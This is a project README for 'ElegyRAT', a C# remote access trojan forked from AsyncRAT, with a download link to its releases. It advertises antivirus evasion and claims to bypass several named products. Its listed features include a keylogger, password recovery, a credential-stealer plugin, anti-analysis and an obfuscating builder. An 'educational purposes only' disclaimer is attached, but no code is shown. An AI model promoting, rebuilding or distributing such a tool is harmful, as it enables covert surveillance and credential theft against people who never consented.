![Start.png](https://i.loli.net/2020/12/28/a35p7AtMfrDVPKQ.png)

# ElegyRAT-C-Sharp

ElegyRAT is a Remote Access Tool (Be Based On [AsyncRAT](https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp)) designed to remotely monitor and control other computers through a secure encrypted connection.It mainly rewrites the task startup items and individual plug-ins to facilitate bypass AV Static killing and behavior interception.(As of 20201231 Bypass 360sd HuoRong Kaspersky Microsoft defender a series of antivirus software,for learning research only,do not use for illegal purposes.)

# Included projects

##### This project includes the following

- Plugin system to send and receive commands
- Access terminal for controlling clients
- Configurable client manageable via Terminal
- Log server recording all significant events

##### Features Include:

- Client screen viewer & recorder
- Client Antivirus & Integrity manager
- Client SFTP access including upload & download
- Client & Server chat window
- Client Dynamic DNS & Multi-Server support (Configurable)
- Client Password Recovery
- Client JIT compiler
- Client Keylogger
- Client Anti Analysis (Configurable)
- Server Controlled updates
- Client Antimalware Start-up
- Server Config Editor
- Server multiport receiver (Configurable)
- Server thumbnails
- Server binary builder (Configurable)
- Server obfuscator (Configurable)
- And much more!

### Technical Details

The following online servers / resources are used in this project

- [pastebin.com] - used for the "PasteBin" option in client builder
- [github.com] - used for downloading and uploading changes to the project

### Installation & Deployment

AsyncRAT requires the [.Net Framework](https://dotnet.microsoft.com/download/dotnet-framework/net46) v4 (client) and v4.6+ (server) to run.

```
- to compile this project(s) visual studio 2019 or above to is required
```

### Plugins

Currently the program makes use of several integrated DLL's (see below for more details)

| Plugin     | Source                        |
| ---------- | ----------------------------- |
| StealerLib | [gitlab.com/thoxy/stealerlib] |

### Download

[ElegyRAT-C-Sharp/releases](https://github.com/zhaoweiho/ElegyRAT-C-Sharp/releases)

### Are you a C# or .Net Developer and want to contribute?

##### Great!

Please read through the project first to get an idea of how the program is structured first after which create a fork with your own changes and purpose a pull request as well a an issue referencing what you have changed, why you have changed it, and why / if you think it should be implemented

### LEGAL DISCLAIMER PLEASE READ!

##### I, the creator and all those associated with the development and production of this program are not responsible for any actions and or damages caused by this software. You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only. This software's intended purpose is NOT to be used maliciously, or on any system that you do not have own or have explicit permission to operate and use this program on. By using this software, you automatically agree to the above.

## License

[![License](https://camo.githubusercontent.com/e754645b75702ffcc623fb15d15bd88c0d988ee8a304791fc009ce45268faed6/687474703a2f2f696d672e736869656c64732e696f2f3a6c6963656e73652d6d69742d626c75652e7376673f7374796c653d666c61742d737175617265)](https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp/blob/master/LICENSE) This project is licensed under the MIT License - see the [LICENSE](https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp/blob/master/LICENSE) file for details
